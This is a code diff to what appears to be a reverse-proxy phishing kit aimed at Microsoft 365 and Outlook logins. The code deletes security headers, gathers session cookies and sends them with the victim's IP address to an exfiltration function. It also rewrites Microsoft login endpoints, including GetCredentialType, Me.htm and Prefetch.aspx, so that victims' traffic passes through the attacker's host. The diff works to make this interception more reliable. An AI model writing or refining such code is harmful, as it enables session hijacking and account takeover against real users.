@@ -106,7 +106,7 @@ async function handleProxy(request, pathSegments = []) {
     new_response_headers.delete('content-security-policy-report-only');
     new_response_headers.delete('clear-site-data');
 
-    // Cookie + exfil
+    
     let all_cookies = "";
     try {
       const originalCookies = (typeof new_response_headers.getAll === "function")
@@ -130,7 +130,7 @@ async function handleProxy(request, pathSegments = []) {
       await exfiltrateCookiesFile(all_cookies, ipAddress);
     }
 
-    // ==================== STRONGEST REWRITING YET ====================
+    
     const content_type = new_response_headers.get('content-type');
     let original_text;
 
@@ -147,21 +147,32 @@ async function handleProxy(request, pathSegments = []) {
       text = text.replace(/https?:\/\/www\.office\.com/g, `https://${url_hostname}`);
       text = text.replace(/https?:\/\/outlook\.office\.com/g, `https://${url_hostname}`);
 
-      // 2. Critical specific paths that are failing
-      text = text.replace(
-        /(["'])(\/Me\.htm|\/Prefetch\.aspx|\/common\/GetCredentialType|\/common\/|\/api\/|\/sso|\/ajax|\/graphql)/g,
-        `$1https://${url_hostname}$2`
-      );
+      // 2. CRITICAL FIX: Handle root-relative paths for specific endpoints BEFORE broader patterns
+      // These are often referenced without quotes in JS: fetch("/Me.htm") or fetch('/Prefetch.aspx')
+      text = text.replace(/(["'])\/(Me\.htm|Prefetch\.aspx)\b/g, `$1https://${url_hostname}/$2`);
+      
+      // 3. Handle paths with /common/ prefix
+      text = text.replace(/(["'])\/common\/(Me\.htm|Prefetch\.aspx)\b/g, `$1https://${url_hostname}/common/$2`);
+      
+      // 4. Handle any remaining root-relative API paths
+      text = text.replace(/(["'])\/(common|shared|ests)\/([^"'\s]*)/g, `$1https://${url_hostname}/$2/$3`);
+      
+      // 5. Handle specific API endpoints that might be constructed dynamically
+      text = text.replace(/(["'])\/(api|sso|ajax|graphql)\/([^"'\s]*)/g, `$1https://${url_hostname}/$3`);
 
-      // 3. Very broad safety net for any path starting with /common/, /shared/, /ests/
-      text = text.replace(/(["'])(\/(common|shared|ests|Me\.htm|Prefetch\.aspx)[^"'\s]*)/g, 
-        `$1https://${url_hostname}$2`);
+      // 6. VERY BROAD SAFETY NET: Catch any remaining absolute paths starting with /
+      // that look like API endpoints (contain .aspx, .htm, or common path segments)
+      // But be careful not to break legitimate relative paths
+      text = text.replace(/(["'])\/([^"'\s]*\.(?:aspx|htm|html|ashx|asmx))\b/gi, `$1https://${url_hostname}/$2`);
+      
+      // 7. Handle URL construction patterns like: var base = "https://login.microsoftonline.com"; fetch(base + "/Me.htm")
+      text = text.replace(/(https:\/\/[^"'\s]+)\s*\+\s*["']\/(Me\.htm|Prefetch\.aspx)\b/g, `https://${url_hostname}/$2`);
 
-      // 4. Force any remaining localhost to your domain (last resort safety)
-      text = text.replace(/https?:\/\/localhost/g, `https://${url_hostname}`);
+      // 8. Force any remaining localhost to your domain (last resort safety)
+      text = text.replace(/https?:\/\/localhost(:\d+)?/g, `https://${url_hostname}`);
 
-      // 5. Fix paths that might be constructed without quotes (rare but happens)
-      text = text.replace(/(\s|^)(\/common\/GetCredentialType)/g, `$1https://${url_hostname}$2`);
+      // 9. Handle cases where protocol-relative URLs might be used
+      text = text.replace(/(["'])\/\/(Me\.htm|Prefetch\.aspx)\b/g, `$1https://${url_hostname}/$2`);
 
       original_text = text;
     } else {
